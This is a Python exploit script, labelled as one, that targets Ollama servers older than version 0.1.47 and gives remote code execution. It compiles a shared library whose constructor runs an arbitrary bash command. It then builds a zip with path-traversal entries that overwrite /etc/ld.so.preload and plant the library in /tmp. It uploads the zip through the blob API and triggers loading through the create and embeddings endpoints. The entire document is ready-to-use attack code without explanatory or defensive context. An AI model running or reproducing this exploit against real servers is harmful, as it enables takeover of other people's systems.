import argparse
import hashlib
import json
import os
import subprocess
import zipfile
import requests
from urllib.parse import urlparse

CODE = """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) myInitFunction() {
    const char *f1 = "/etc/ld.so.preload";
    const char *f2 = "/tmp/hook.so";
    unlink(f1);
    unlink(f2);
    system("bash -c '%s'");
}"""

def main():
    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('--target', required=True, help='target URL')
    parser.add_argument('--exec', required=True, help='command to execute')
    args = parser.parse_args()

    target_url = args.target
    exec_cmd = args.exec

    u = format_url(target_url)

    if not detect(u):
        print("\nVulnerability does not exist")
        exit(1)
    print("\nVulnerability does exist!!!")

    gen_evil_so(exec_cmd)
    evil_zip_name = gen_evil_zip()

    blob_sha256_name = upload_blob(u, evil_zip_name)
    create(u, blob_sha256_name.replace(':', '-'))
    embeddings_exec(u, "all-minilm:22m")

def gen_evil_so(cmd):
    code = CODE % cmd
    with open('tmp.c', 'w') as f:
        f.write(code)

    compile_process = subprocess.run(['gcc', 'tmp.c', '-o', 'hook.so', '-fPIC', '-shared', '-ldl', '-D_GNU_SOURCE'])
    if compile_process.returncode != 0:
        raise Exception("Failed to compile hook.so")

    return 'hook.so'

def gen_evil_zip():
    with zipfile.ZipFile('evil.zip', 'w') as zipf:
        zipf.writestr('../../../../../../../../../../etc/ld.so.preload', '/tmp/hook.so')
        with open('hook.so', 'rb') as so_file:
            zipf.writestr('../../../../../../../../../../tmp/hook.so', so_file.read())

    return 'evil.zip'

def upload_blob(target_url, file_name):
    with open(file_name, 'rb') as f:
        h = hashlib.sha256()
        h.update(f.read())
        f_name = f"sha256:{h.hexdigest()}"

        f.seek(0)
        res = requests.post(f"{target_url}/api/blobs/{f_name}", data=f)

        if res.status_code != 200:
            raise Exception(f"Failed to upload blob: {res.text}")
        print("http log: " + res.text)
    return f_name

def create(target_url, remote_file_path):
    json_content = json.dumps({"name": "test", "modelfile": f"FROM /root/.ollama/models/blobs/{remote_file_path}"})
    res = requests.post(f"{target_url}/api/create", headers={'Content-Type': 'application/json'}, data=json_content)

    if res.status_code != 200:
        raise Exception(f"Failed to create: {res.text}")
    print("http log: " + res.text)

def embeddings_exec(target_url, model):
    for _ in range(3):
        json_content = json.dumps({"model": model, "keep_alive": 0})
        res = requests.post(f"{target_url}/api/embeddings", headers={'Content-Type': 'application/json'}, data=json_content)

        if res.status_code == 200:
            print("http log: " + res.text)
            break
        else:
            print("pulling model, please wait......")
            pull_minilm_model(target_url)

def pull_minilm_model(target_url):
    json_content = json.dumps({"name": "all-minilm:22m"})
    res = requests.post(f"{target_url}/api/pull", headers={'Content-Type': 'application/json'}, data=json_content)

    if res.status_code != 200:
        raise Exception(f"Failed to pull model: {res.text}")
    print("http log: " + res.text)

def detect(target_url):
    res = requests.get(f"{target_url}/api/version")
    if res.status_code != 200:
        return False

    json_map = res.json()
    if "version" not in json_map:
        return False

    return is_version_less_than(json_map["version"], "0.1.47")

def format_url(u):
    parsed_url = urlparse(u)
    return f"{parsed_url.scheme}://{parsed_url.netloc}"

def is_version_less_than(version, target):
    v1 = list(map(int, version.split('.')))
    v2 = list(map(int, target.split('.')))

    for num1, num2 in zip(v1, v2):
        if num1 < num2:
            return True
        elif num1 > num2:
            return False

    return len(v1) < len(v2)

if __name__ == "__main__":
    main()
